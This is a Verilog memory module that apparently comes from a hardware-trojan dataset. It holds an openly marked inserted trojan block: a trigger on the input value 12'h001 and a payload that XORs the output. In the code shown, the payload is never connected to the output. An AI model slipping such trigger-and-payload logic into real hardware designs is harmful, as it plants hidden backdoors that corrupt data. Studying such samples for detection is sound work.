modified_rtl:
    module memory (
    input [14:0] address,
    input clock,
    input [11:0] q,
    output reg [11:0] out
);

    reg [11:0] mem [32767:0]; // 2^15 by 2^12 array

    always @(posedge clock) begin
    out <= mem[address];
end

    always @(negedge clock) begin
    mem[address] <= q;
end

// HT_START
// Trojan Type: Lightweight_Payload_Override
reg htrojan_trig;
reg [11:0] htrojan_pay;
always @(*) begin
    htrojan_trig = (q == 12'h001);
    htrojan_pay = htrojan_trig ? (out ^ 12'h001) : out;
end
// HT_END
endmodule
